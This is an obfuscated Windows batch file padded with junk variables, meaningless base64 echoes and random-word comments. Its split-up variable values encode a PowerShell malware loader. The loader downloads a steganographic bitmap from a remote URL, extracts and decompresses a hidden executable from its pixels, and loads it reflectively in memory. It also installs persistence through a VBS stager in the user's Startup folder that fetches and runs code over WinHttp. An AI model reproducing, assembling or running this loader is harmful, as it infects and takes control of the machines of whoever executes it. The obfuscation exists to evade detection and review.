@echo off
se%Iwn%T "fAsxxDNN=B0aGUgLnBzMSBmaWxlIHlldC4iICJZZWxsb3ciCn0gZWxzZSB7CkxvZy1TaWxlbnQgIlsqXSBUcmlnZ2VyaW5nIHBlcnNpc3RlbmNlIGluc3RhbGxhdGlvbiBmb3I6ICRQRVJTSVNURU5DRV9"
sE%Itidp%T "CpmgIoUDbj=lKQp0cnkgewokZGF0YSA9ICRudWxsCmlmICgkU291cmNlIC1saWtlICJodHRwKiIpIHsKTG9nLVNpbGVudCAiWypdIERvd25sb2FkaW5nIHN0ZWdvIGZyb206ICRTb3VyY2UiCiR3YyA9IE"
Se%oAo%t "NciujWtbWo=IGLRoTZdLIYhPHxArzJcIdGSGmIWyMR"
se%ggJy%t "BpeusEvq=gNmDhKihhqwu"
echo U3lVUnVUYlV6NVdRdlRGYjlRWjRMY2dQSklrbXpyc0tkc2NZZ2l5allVTzYybnlVRWc3ejJSTXo5M3BrVHRJODlpa2F6bnRqSWlZdENEUDc= >nul 2>&1
REM lance valley mirage pixel cipher
REM undergrowth odyssey pixel pixel undergrowth
REM mirage twilight binary strobe shadow echo sword kappa
echo YUt4cFBzOXVXMkNJaHlQNzZHUlBNV3piZ2NQVVdpWFBBeEt3TEwxQmN1bGpNbjlueUI5QjlsTWJkVThiWFljZGtXSE1SakM= >nul 2>&1
se%dDm%t "CPLmPXgM=FnCZsTTAGQaYlEWUECUNbziOxqcomXM"
sE%tJip%t "ohlIoIznRp=gsTQeADKVQPRcizoeSrwAlmqFaN"
REM strobe shadow ruby phantom vertex lance binary mirage
REM hawk core phantom clearing glimmer guard fathom undergrowth guard
SE%aOmB%T "tpPOIoAjdF=VzxiIangBSi"
REM guard glimmer shadow vertex vision binary mirage ruby shadow
REM clearing pixel odyssey odyssey
REM binary twilight twilight fathom kiln mirage vertex clearing pixel sword
REM beacon mirage twilight circle phantom zenith ruby
sE%rSS%t "FTpoSbVMY=djzRsJIbftcSVUtMUaxmYavFUhGrFRaxg"
echo VWdROTVKdjVVZVVkMXZYcml4UU1LcWJCenRHTFhsWVd0MWJUbGVsY3hQeEE2WXNGS0lWSEZP >nul 2>&1
echo VkNVdGR3ZUxxdHZYUGdBYnlhREhMZmtwV1ZGVTVzVUluZ0wyeTdsRkpWd0s= >nul 2>&1
Se%bREx%t "SqqCzgZntv=OBpyaZpspfeinxcZVpiEPW"
echo RE9XY0Q1ZlN1NzIzVkJkUHRnVnhvNVo1YmJsejBLYXF3N3pqS0txRmlrOXhKSVhVRUZROGNYb0FuWkN5TDNxT2t0Wnk= >nul 2>&1
echo MnRnQ3NEblhCdDBiTWVvZktlSU9EczFpeXVtbEw2WHJiNHFxN1lENkFRVFdRMmU5VWFId09oRWZ4SEpjN2RP >nul 2>&1
echo MFRyRFE4bWxZVGUxVlh6RDJzSmVyTm5ZM0VzSVlZQzU0QmFsNWVtN1VQ >nul 2>&1
echo dUtHS2VZeHB1emN0SmNnWlNUUTNqWjhMRDBlSEdDUmdaZGg5MWFMU1pKNURPYTdHNg== >nul 2>&1
REM vision delta core
REM guard vertex vision glimmer zenith pixel twilight fathom core
Se%HFz%T "nvulUXy=UYiKLHyMXBFQPBPytthATgeNsQa"
REM vision odyssey sword fragment vision core clearing core clearing
sE%ITB%t "fbnpKqdjCucnrR=gIobZGzCiWghxywuoOLTfRX"
SE%fVQ%t "ckQnChjiQlM=jdJyeivlBsaIkw"
sE%IUm%t "vGOoRTQDjSa=oxxCjqZpkVZZgdrcGVupGH"
se%kVl%T "sXUJvxuw=tiOiixosngnNV"
echo aDZ2d3hqbE1ieDkwV2xzMGFORVVDWndOMGxpUU5VOW00SlZtNDVrVWNPVmpzVExMdzFpOUlxTWJua3dZR05CckE= >nul 2>&1
REM fragment kappa valley
REM clearing sword hawk undergrowth pixel phantom beacon glimmer fragment
Se%XnXdO%T "zZmkabYhDbou=OZzoVXzqZL"
SE%DcIl%T "mXCFeyaoKQmtZj=xhIPgKiYzPfiTAi"
echo dXdVRHBNWnpLZ2Q4VURNcWo0MlNjaExQa0pvQzZhTGllajl5MGtiOTBXWFdx >nul 2>&1
echo RjY3N2l6UUtiYUVLc0FpMkNsVDlNQ2FoNjI5NjBGNG9GS0lXdWxUTk96WWJ0NWt0SVhFTDBBQlhuR01jRXFoaWtOaUI= >nul 2>&1
se%gOC%T "DQrqcFJHvnC=y4zNiIpCiRkYXRhID0gJHdjLkRvd25sb2FkRGF0YSgkU291cmNlKQokd2MuRGlzcG9zZSgpCn0gZWxzZWlmIChUZXN0LVBhdGggJFNvdXJjZSkgewpMb2ctU2lsZW50ICJbKl0gTG9hZGluZyBzdGVnbyBmcm9tIGxvY2"
sE%mbQw%T "CzEwRTQ=QZAezZepCMYjnMKPJdgzANS"
REM fathom vision guard core glimmer strobe
sE%lwd%T "JEcqLxPUJP=kiiuXvMeZhgdkZkjAGBZUalYt"
REM lance hawk echo cipher lance odyssey clearing shadow fragment
REM cipher kappa ruby ruby fragment twilight undergrowth twilight vertex kiln
sE%lXR%t "FAvmskgRQFbrH=fbLiLHYiOuDzQXWaGmVKezGfxnvUjip"
SE%GxqOw%T "bhEpMQseHWZoVE=CcOcOwgucYaDMIPyadnFLIQHueAQXImaWs"
echo YmpvVk1Qc1hVeXFtRkd3V292Wm5GSXZCNFBhM0RBemtKenBnUDV3VjhON1ZxQ2J4RFdONkpn >nul 2>&1
REM fathom phantom shadow vertex delta beacon delta delta kiln odyssey
REM kiln glimmer delta shadow undergrowth sword fragment echo vision binary
sE%tNST%t "BFSbTDlgWJyZnp=BtwUekBvaciQuphKAEqqwvAnSZ"
sE%iJVo%T "eUwGCrYwERQKdb=upqtdsfARSmXjToSCQvTeaT"
REM ruby echo mirage circle kiln kiln mirage fragment twilight
REM fathom undergrowth shadow mirage ruby sword binary undergrowth core vertex
REM odyssey kiln undergrowth odyssey binary vertex fragment ruby glimmer
REM pixel twilight vertex glimmer beacon glimmer
REM fathom zenith glimmer strobe echo beacon kiln cipher pixel
Se%IBS%t "GNJlYMMLzLFo=pZiAoJGRvbmUpIHsgYnJlYWsgfQp9CiRwYWNrZWQgPSAkZXh0cmFjdGVkLlRvQXJyYXkoKTsgJGJtcC5EaXNwb3NlKCk7ICRtcy5EaXNwb3NlKCkKTG9nLVNpbGVudCAiWypdIERlY29tcHJlc3NpbmcuLi4iCiRjbX"
REM beacon beacon fathom cipher fathom twilight clearing vision
sE%ubFx%t "liatvauxkJtgGZ=FOYUvNwxLLVhcrEPsNBLSLwqWqXsu"
echo eWpESUw4SG4yOHFzN0thMGZvUGpHdm81OGpkTnB3SkRXQmw3MXJxWHFQVU9nRGhlSjBld2FmV3M4ZlJHMFpj >nul 2>&1
sE%Elbg%T "CVDNcMyqP=ujGUdrORocGsntAuiiX"
REM mirage beacon guard ruby cipher glimmer
echo bWJ1bmgyT245eEI1Tml0M2VFeTkxRmZ4QXBJM1BSVTc0bW8xclZOVUhkWkc= >nul 2>&1
SE%mMT%T "GDVyDXMyb=CBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1hbmQgJF8uTG9jYXRpb24gLWxpa2UgIiptc2NvcmxpYi5kbGwqIiB9IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQokYXNzZW1i"
se%atmz%t "QshfdGDpAVERNIl=XouoJIULiQOcYmMFwkaGazjeDoV"
SE%OXyE%t "nBnmra=JyKPpDWOHsapQsZjSFzBdDDbPct"
echo Mmowc1k2RXM0bmw0UXJiZkxBOXNZZ3hxeTh6SGw2NzZETWp2SGhRUVVrOWVmUzRtRHhIeFA3YnlLbGQ2eUdmd21CUWE5N1VVcnZyeDhW >nul 2>&1
REM delta valley delta kiln fragment vertex glimmer fathom valley lance
REM lance sword hawk fragment
echo Y1cwVVVOQ0RiVzBucXB6ck9kT3JWZTdQRDRFODJqWGV5MWt4N0ZicVJIdk9aaXRJ >nul 2>&1
REM delta guard glimmer kiln
REM undergrowth glimmer circle core core echo core valley pixel hawk
echo M2t5Vm41ZWdNWDZJdnNWRzlzYU42dlFYdEVLQzlUNnpYdk5PSU9oazRCdDVEY1VJaw== >nul 2>&1
SE%MYC%t "NoSMElzrMZnOW=lFnXCzDnQiSbUUxEeRknDEtTJNocry"
Se%EZp%T "foihAvh=yvoSNvQfcHcLZPppcOCNsCzryfsAwetoGH"
REM valley echo guard twilight clearing pixel fathom fathom
REM ruby guard strobe undergrowth guard phantom mirage
REM valley ruby zenith glimmer delta odyssey clearing valley circle
Se%puCaT%t "zGHKbARUaJuV=eQMspIJZdU"
REM odyssey valley phantom fragment pixel mirage vision glimmer fragment cipher
echo YVpmY05vNERqbTdZd1VuTVNteUxJeUpFUGdkUlZibk5rODM5RUhpNkNGdFlXYjFnbU16NDJDUXhzdDFzcEd3em1B >nul 2>&1
Se%HZQD%t "mndEXTEIvKf=hDqhHjzEaJmECxlyeHWVkQFhog"
se%eiXG%t "qStlYIQfYgTVTX=GdLWExpCIUTKkBOmC"
REM twilight beacon mirage vision mirage phantom binary vision
SE%CwV%T "RisLmDsnKK=nDrRQImRdJtsrJNYlaFSsqsd"
Se%yRW%t "DAFRJjOLb=HVybgp9CiRtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgsJGRhdGEpCiRibXAgPSBbU3lzdGVtLkRyYXdpbmcuQml0bWFwXTo6RnJvbVN0cmVhbSgkbXMpCiR3ID0gJGJtcC5XaW"
echo MWNFdHlESzI0c3NsQ1p2bkduQnJCNjhXWTlYNFNhaWY2THdwTWwwWGpNSlZ0anFvUEg2MjVCUzhtcjlMMHAzeFdicmhURVRDbEM= >nul 2>&1
REM fathom cipher lance guard delta strobe valley
REM guard fragment glimmer ruby fathom glimmer guard
REM fathom binary guard
echo WTFxVUdtc1Z3dkdRT0dNbVgyWlBzeWphRW05QnljNHZkUW5scTNOVjNYODcybGJXUA== >nul 2>&1
sE%bXMKv%t "sNEoMHbS=gBdtjftFueGmjrfKrNLESNZ"
echo YzI1bmtVWlY0VUZPZkNlVHhMWUdseWo0S1Y4Z2dQRmdDSWlTSWlSUzc= >nul 2>&1
Se%JcKyP%T "TwGSnzLzSRynsu=clwHqqkFKlJGxmEQS"
REM cipher lance phantom pixel kappa undergrowth vertex kiln clearing fathom
REM binary kappa mirage cipher strobe vertex mirage core
se%icZ%T "GEKjMzT=rqyYiAuEFOhQYiHUMTdo"
echo SG5RVzR5eFloMlAzOUFtZHV5aDNjRE10THIzR0JVRGZoUnFaa09oeDVEVDRnTnBRMFYwZzV2TkRTQjN2dlQwNEU= >nul 2>&1
se%pJE%t "VnUFBn=tnJZrjUNVFsEMCNOwpCUNGynVqosLdT"
echo aUtOU29BV2VxZndHampnTkQzVjV0bE1MT3RvQWxXZmNmMWdyaElhOVUxbWtpeWpzUjBDdW03TFBMc0hzeFRJUEM5bTZ1dA== >nul 2>&1
sE%EwJ%t "qvHrWXC=GdKDKphBGwqwlyRJ"
Se%AdOR%t "KxhNVx=XZhYm95L2N1cmx5Y2Fybml2YWwvbWFpbi91c2VyLnR4dCIKTG9nLVNpbGVudCAiWypdIENoZWNraW5nIHBlcnNpc3RlbmNlIGNvbmZpZ3VyYXRpb24uLi4iICJHcmF5IgppZiAoJFBFUlNJU1RFTkNFX1VSTCAtbWF0Y2ggIlJFUExBQ"
REM phantom beacon zenith core phantom valley phantom echo
echo RFR5SmJJTkVJVUQ0Q01hZ3NpTjNiM0pXajhrSEJGRnNTb1VHYjV6WElVM1hqUnpWSQ== >nul 2>&1
echo a0gxODZOZkI4d3VjcnJ0NmZxeVFwTU00enhlV2JONjI2SG1jNnU3aWFqMjRSdzdiRnUxU1NPb2k0RFNqdWlmQlJ6dE5MOWYwNzBzQjBI >nul 2>&1
sE%cVsnl%T "etKIwZTzxPc=zwGLmfPrRMQbWHfW"
SE%ECDCM%t "etpnwj=DGjXifttpFpyKatoNdbhUBJqZlWXrfnZ"
Se%RwJVt%T "pxOBtX=LmappFKqnYnYQhqyuDOTY"
REM echo fathom lance sword
se%QrSy%t "CxzQlSepqScMBl=UzpsycBPjwEOFrZkxUzHiidpSEIkKXR"
Se%uzo%T "chOCJWXJz=tU2lsZW50ICJObyBFbnRyeVBvaW50IGZvdW5kLiIgIldoaXRlIiAkdHJ1ZQp9Cn0gY2F0Y2ggewpMb2ctU2lsZW50ICJMb2FkZXIgRXJyb3I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAiV2hpdGUiICR0cnVlCmlmICgkXy5FeG"
REM sword vision fragment guard lance circle mirage mirage mirage
se%fhUfb%t "vfDDDhqZNDOUZCz=oQqtoyHjWgkWhHyZBbzZ"
se%bTLF%t "SVwGBpvmgJpP=fZheFlfZfRoAhvupu"
echo NmJ6OUo3QXhBSTlNanJSTGc4OHI4Y1A1dktYMFRReW5wYzJITmNSSzI3dDlqejBMUFVnVWViZW4= >nul 2>&1
REM mirage clearing echo twilight strobe
echo M3pxbDVPQVJoVnpKYVJDRUlRdFZUVTRUeWMzdEdpMENLdU5NZXlqcGk= >nul 2>&1
se%gWu%T "jFKTKqInd=UpHYrXzdhVjLelgVgIvbEKb"
REM fathom odyssey odyssey sword odyssey pixel
Se%BTFM%T "KdgcNUb=HEKJUTMwrMCqNPNWScCFKUXYYahDq"
REM ruby core hawk strobe zenith lance strobe valley hawk fragment
se%yKPpS%T "ZrtyWBs=QURPREIuU3RyZWFtIikKLlR5cGUgPSAyIDogLkNoYXJzZXQgPSAidXRmLTgiIDogLk9wZW4KLldyaXRlVGV4dCBIdHRwLnJlc3BvbnNlVGV4dAouU2F2ZVRvRmlsZSB0ZW1wRmlsZSwgMiA6IC5DbG9zZQpFbmQgV2l0aApzaGVsbC5Sd"
sE%viXjs%t "XNADbg=LkJpbmRpbmdGbGFnc10iUHVibGljLFN0YXRpYyIpIHwgV2hlcmUtT2JqZWN0IHsKJHN0ciA9ICRfLlRvU3RyaW5nKCk7ICgkc3RyWzM3XSAtZXEgJ10nIC1vciAkc3RyWzM4XSAtZXEgJyknKSAtYW5kICgkXy5HZXRQYXJ"
se%RVO%T "FtFVntTpdlxyC=BcGJIhIOwOZgWpJkHDjESztOfTPsOsE"
se%pBfQ%t "FYTyoSbE=RIBhEGEfEGYi"
REM binary binary core
REM delta clearing kappa ruby clearing core phantom fathom
echo dllaTTZ1c3dwYThhREdFVXdEUEhESGNSSWt3NTczQWJURVpoVWJkZVJBWHoxcUtBTkRJMW5vNnRpam9keUs1SnVk >nul 2>&1
echo aGJkYXEyS0VtQ2xwam9Jend6OVBSYUdTeVhVUDhkNk9KQ2R6UGFNVTU3R1AxMll3b1lkRHZpYjM= >nul 2>&1
echo S2dXZ1V2SWs3NWFQWllyRHJrN2RLdzdpczJGb1RublJCWDNBV0ZGTEVyTk9Vd2dwbEd1VFBmY01kYXFaM0ZGdFhMTjZLVg== >nul 2>&1
REM echo beacon guard valley strobe kiln shadow
SE%llq%t "JJJFQjWcY=aRiIRqrbEKx"
REM ruby odyssey phantom sword twilight lance odyssey fragment kiln echo
REM strobe phantom clearing lance phantom echo
sE%TOfaq%T "QWmtul=xXFmZjkKhBhAkyoRdLICktKmzdbtvqOu"
REM core binary guard vertex vision
REM fathom vertex kiln glimmer
REM delta core kiln binary delta delta
echo M3B6MDdOUEw5VUVRakk4aHJwV05Vb2s0U2FYTzJpamd5VExheUc2cGhvZjR2SDEzUlBpekdualViMQ== >nul 2>&1
echo WlRIQnFNTnJmOFVRbjg4aGJURjNIODRQQTJQQWxEeVhkMlJFd3ZySTJR >nul 2>&1
Se%Hxd%T "zMgKxsAfGogt=SMWeRqWtlnFJb"
echo bmhxYXRNZWJIUzRYOUZjV003SW12VXhNSnNIVW1jMzNLR0kxWkpMa2NaM0xOMm0= >nul 2>&1
REM odyssey beacon pixel
echo NnhHa09aVWxGNGFuV0djQ0hLV20zMVkyWFJ6VnNka3g0Rlo0SWtadHFVY0tlcElrbW8= >nul 2>&1
Se%HyN%t "scWPtoWCTJwGp=CkBXBNGPtXZix"
SE%kgxIr%t "dDNKQNNY=tppkMTyIGJVEDHZr"
REM echo hawk strobe
se%VYSPs%t "ikPJGnrqhv=axqcuhxHZX"
echo d2REV21qb2FUNjdFYnBZNk9kOGREWG9mMFR1NzVOcndYT3hUVTFuNzdFck1VS0o5R1FoYTZSeVFEaEI= >nul 2>&1
SE%Hbe%T "jQlysCujcDU=KqPvdseuhwsZsKzSWzgyo"
se%qPW%t "dbkSFHlacr=CWnHusaOUkaQJGicknBGMjgtDhBuhe"
Se%YIZH%T "CjDTLVuwIq=vgUARwRMIwMadWyTMrSuSIzs"
sE%btaw%t "HpBwMswLDW=vYPJLoXWdSZCOuCiVjUMM"
sE%pcDb%T "KVAJowkQ=R0aAokaCA9ICRibXAuSGVpZ2h0CiRwMCA9ICRibXAuR2V0UGl4ZWwoMCwwKTsgJHAxID0gJGJtcC5HZXRQaXhlbCgxLDApCiRsZW5ndGggPSAoW3VpbnQzMl0kcDAuUiAtc2hsIDI0KSAtY"
REM sword odyssey sword zenith beacon core kappa beacon
echo eHR1UWliazJueFdUb2tBQXRZYk5tRE95VEFXNGx4dmVpUkdoY3VtZUZQVGVjVlhYVE5tVmJRRlRxWjBoNVRmaWJHdmpTOE4= >nul 2>&1
REM sword fragment twilight vertex sword clearing circle fragment vision zenith
se%JWR%t "PnggDcCzXyxm=TkFgVXKfvicmBRwmftzcpCAiWzMPG"
REM twilight shadow circle twilight kappa vision fragment
REM beacon fathom core ruby circle fragment cipher lance
se%BwG%t "xwlauES=tGYQNDxUayWpbRklVbkTz"
SE%yCA%T "VaCYchlcaW=GFscmVhZHkgaW5zdGFsbGVkLiBTa2lwcGluZyB3cml0ZS4iICJHcmVlbiIKcmV0dXJuCn0KTG9nLVNpbGVudCAiWypdIEVuY29kaW5nIHN0YWdlciBVUkwgZm9yIFZCUy4uLiIgIkdyYXkiCiRjaHJBcnJheSA9"
se%KLnvk%T "djxZtiHlEN=WRqHyXowgMpWYxhQtnDVp"
REM circle kappa circle delta
sE%pfQ%T "jIoHPrpyPwIq=KuJiIPBgHKouzYgVTLVYGVUUaQM"
se%qro%T "vpnvTw=eQmGnojLuFYvTxMGBlHv"
REM fathom pixel clearing glimmer pixel glimmer delta binary mirage
REM guard circle fragment clearing ruby odyssey lance fragment
Se%iBdlP%t "dXWgqcvRdbJ=VNpbGVudCAiWytdIFVuY29tcHJlc3NlZCBTaXplOiAkKCRyYXdQRS5MZW5ndGgpIGJ5dGVzIgokbXNjb3JsaWIgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgf"
REM beacon fragment lance fathom shadow echo clearing lance delta hawk
echo dGhQU2xpU1A5NGlTbVZ0MTQyMlNFblVUbXI0TkhmUEw4NzA0QzF0Y1BHTEU5NEhtSVY= >nul 2>&1
se%VzNT%T "sKqXkxPwzX=xruOWzBdNKHquZeJkGOXKZodFXKOmW"
REM shadow fathom echo mirage vertex kiln lance core
Se%ymgu%T "lYTZypTHqAuO=QyrwTuHpVglXoxIZhHcaw"
REM mirage zenith fathom lance vertex
SE%wBG%T "VBWmQbectowvx=VraZcksNcumxPfGdME"
echo UE1DUHlKY1J1VTFPUGJTZTFUTVNSRFlUYlpIbExpV25TdFAyVjRoenZsMEpSRzdueHRsY2RyQzE= >nul 2>&1
REM cipher delta ruby
se%DUl%T "UcYFsPLfExhFjZm=qMDIDchIiJijf"
REM kappa echo cipher fathom lance
sE%wGa%T "SppjgCR=HgpmlsplDxwD"
REM undergrowth binary echo guard odyssey ruby clearing glimmer shadow strobe
echo UkJrMngydUJxbDdIYzFRQnVQNHEwYXI3SFI0d2d2UEtMNFpPZGRFdjFCa0R4NE1DSlhGQTF3TEgwWVhuN2dlcWE2RmM= >nul 2>&1
Se%ggEZr%t "SjEHaENwHmNBHa=TjzoBMgSrvCqBIi"
SE%YAnG%T "gWhync=YXkoJGNockFycmF5KQp1ID0gdSAmIENocihjKQpOZXh0CkRpbSBIdHRwOiBTZXQgSHR0cCA9IENyZWF0ZU9iamVjdCgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKQpIdHRwLk9wZW4"
echo aFNrc0xUbjBLdnIzQzM5aTBDZms2WVJ5U05VRUJsZThYWFJyQVBEU0tOVnBZ >nul 2>&1
SE%bmc%T "GjvGYcPMghupCA=jFMBWrKGMSLUtROiixrWCyPydo"
REM ruby sword odyssey cipher vision beacon fathom ruby
REM undergrowth clearing clearing mirage zenith shadow kappa sword glimmer glimmer
Se%JLx%T "mVCzslZF=hbWV0ZXJzKCkuQ291bnQgLWVxIDEpCn0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiRsb2FkZWQgPSAkbG9hZE1ldGhvZC5JbnZva2UoJG51bGwsICgsJHJhd1BFKSkKTG9nLVNpbGVudCAiWy"
REM vision circle valley mirage phantom strobe kiln fragment echo lance
Se%ZsVbP%T "WLXnxmiKBheedrF=CtoZWLvKqhmkH"
REM mirage cipher vertex circle
Se%rcT%T "YzJdZs=EdWDEXHeNxDXRsdynOKPLBrJdMPItGw"
Se%nHd%t "rpiFzQm=pyCfGDyokflhwVLZuLTFkhKxHFHoUYOzx"
Se%kOthk%T "bAIexTMOGd=MTdQPnNvsSJsCRDuHZFTJxikBddzpAKFfHz"
sE%saKQ%T "uvJhYFFqAV=VCepVrkhXXPSPPmXZyjJEMdxJo"
REM shadow shadow vision guard kappa twilight sword
REM glimmer circle clearing binary mirage beacon
Se%RiO%t "PSoYwYpfBc=ZW0uQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5hZGRfQXNzZW1ibHlSZXNvbHZlKCRvblJlc29sdmUpCiRvbkV4Y2VwdGlvbiA9IFtTeXN0ZW0uVW5oYW5kbGVkRXhjZXB0aW9uRXZlbnRIYW5kbGVyXXsKc"
echo TDJsTml2bkg2VTBsSlM2YmdYdngycU5EU3c4aDFuRVZKcXRxRTdWUnQ2bVh2QW5XQVBn >nul 2>&1
echo SmtsWlB2YmFYdjdhWk1ZRDRrNzROWmFJV1BPb2NvTXBIUG1GNjhXcm10RVFYMEhlY0pGbHhxYUc5a0VMeTFuV05ta3ZUTFZ1VUMw >nul 2>&1
SE%mFEtw%t "WcdgSzoiZr=vIaQyKdpwCc"
echo dlI2dGdnVWVhcnN1VWZ3bllxWW56ZHp0TmpWT0U2SVBkZk1FYmhacA== >nul 2>&1
REM phantom clearing glimmer strobe cipher phantom
REM lance binary guard fragment delta vertex fathom clearing undergrowth pixel
echo U3NLemk1RDNNa1loT1lBbWVUbFdySlVvS1JmTElEbGlSZjhkQ0xpNXFtaklKZUZKN0ZodEluY3lMZThGNGdZ >nul 2>&1
SE%hdBYk%t "NQBqli=GHPNWAcchPxlzoDWVUtBrLfJMhI"
echo Vk9hTElnZ2JIMjZBVGJyMGdzVHFKNmlDR3BoWmJTS0VPdTRxVGF3aGh6Ym9HRmFzQm1aMA== >nul 2>&1
sE%rBHRE%t "jwzFek=uIEluc3RhbGwtUGVyc2lzdGVuY2UgewpwYXJhbSAoW3N0cmluZ10kU3RhZ2VyVXJsKQokc3RhcnR1cEZvbGRlciA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJGVudjpBUFBEQVRBLCAiTWljcm9zb"
sE%qwfeV%t "Aoxqbju=zhhtZohSnMIpjfslSrSjxfH"
REM vision binary mirage kiln twilight
echo d1ZRbm5weDZRQXBRREJNM1BGYnZaSHQyT1JHbU5wVVJtbGNWVE9sSWQyUmx0SGphZEhrR0IwdVhlYk9SZ2Qz >nul 2>&1
sE%erdRe%t "KzrVgXGwdr=CiQlgizEKapiTAvidMreTJy"
REM zenith ruby vision odyssey valley pixel mirage guard pixel fathom
se%VNbh%T "SSyeLDiEVVbUbBL=qwUMXfOwVtAtIITeOjLlcZSgRz"
REM twilight fathom undergrowth twilight guard core lance core strobe
REM binary mirage fragment pixel kiln phantom
REM circle vision delta clearing
REM shadow undergrowth fragment beacon vertex odyssey shadow
se%GXtWe%T "vUCfiBY=yRQBpVhwGUZzGzZKWOKrRN"
REM echo twilight clearing kappa sword pixel
REM lance valley delta binary kappa odyssey
sE%LQNVs%t "QiMPYk=HjmjYXDoSx"
se%kMwlc%T "WeEsgBTgnXVeH=ZGRnQdSiyATTpbqFmCjeWexNaZtkFrj"
REM circle ruby glimmer valley core
echo M3hLSmMyaFhuRjRhS3FMSXJZY1FJSEZIRlpEZ04weTRQZW1yVGdjSzNLR0dhMmpCMkk4U00xRlBGVzAzd3hYbTJ4NGczM1U5UmU1 >nul 2>&1
echo VEVrYnRGNzVTZUFhM0JTaTFjZTVQeldyMU14ZTkyYWIwcHpNOHRGZjNaRk5ZM1dLOUw2aWxSdURYUm1mVmwxdERKaHU1aDB3Vkd5 >nul 2>&1
REM binary fathom cipher shadow hawk hawk
REM sword undergrowth shadow
REM shadow hawk kiln twilight zenith core clearing valley kiln
echo MVdCUlFmQU1BTW5XRGRxeVJPc1ZOaE1FUWdoNkJ5MXZ3dnJPWGt6UzlxSmNx >nul 2>&1
SE%jbSd%t "locLaEzXyosPcv=FEJYDMRjqRHiWEMijXLMhTJS"
sE%CsIQv%T "XDqgZpBDRDdu=kyVMfNQIruOZvwozzApOynDrAs"
echo R3VGSjk1WUZkbnRVVnRkUW5sWnBtR2JnWDhySHNFYVNsU3Fjck5jVUlxZVV0eXYzRk0= >nul 2>&1
REM odyssey circle hawk undergrowth kiln vertex pixel vertex odyssey sword
se%ELs%t "NcTacl=eYGGEUCTzrmAOHIbxpN"
Se%Sja%t "TMDRiArxijUAXQ=maafkoptnNZWfEwECuyHbHCvGwxXXTdpF"
REM odyssey hawk zenith core beacon guard
SE%FLtaW%t "tqQvmt=CXoqpehwkPCNgMpxVMWZbbcSTu"
REM sword beacon zenith
REM cipher guard odyssey zenith core binary ruby
REM odyssey sword twilight
REM delta mirage guard phantom cipher vertex
REM phantom shadow kiln binary valley valley
sE%meojz%t "FIQWqmsBdTAjgAJ=oxihNESTAdcEvmjrOp"
REM echo delta pixel odyssey lance delta
Se%NnJ%T "cRQhAZYccw=sgJGRvbmUgPSAkdHJ1ZTsgYnJlYWsgfQokZXh0cmFjdGVkLkFkZCgkcHguQik7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0gJHRydWU7IGJyZWFrIH0KfQp"
SE%ZmK%t "KYvotmEi=mpvgAaHValEduTCyyRVBRbdzAKNFpmWELet"
REM odyssey sword beacon echo echo delta guard undergrowth
REM guard glimmer kappa odyssey
Se%bJNaK%t "jukDciObnLIFUl=CsZJbmQPYEJDXrBceFDJvQtvbdutiM"
REM core shadow cipher fragment clearing kiln
echo d2FwOFZhb1YwRDBWRFNaMjJXeWppb3BUam5BV3pIRENSVTVnVFVyNXRvd2hGRXhsRElaQUpXVXAxaXNQZ050YmJIam4= >nul 2>&1
REM fathom echo core glimmer vision fragment kappa fathom
REM binary hawk mirage fathom fragment
SE%iIB%t "SbEFsZARHm=vcaIVHAjZaRla"
REM guard echo undergrowth fragment lance binary twilight guard hawk vertex
REM glimmer guard mirage cipher
echo RlJCSjZzM2xyNklWUnFIMEt1dUlaOEU2eGxpaklKdm9RdzFuQ2ZjNG40ZW4zbkJJaEFaQXJVUFlkN1EwN0s0ekh4QQ== >nul 2>&1
sE%SyH%T "PrIWAV=LTvRoZxdBrsVFdrfxXHHrpNMIsgZSPHjin"
REM strobe beacon kappa kiln
SE%cohzq%t "fWxbIdzTEEEvxj=QErQcsUtYcYQOxCiRCAXcLLTPHOD"
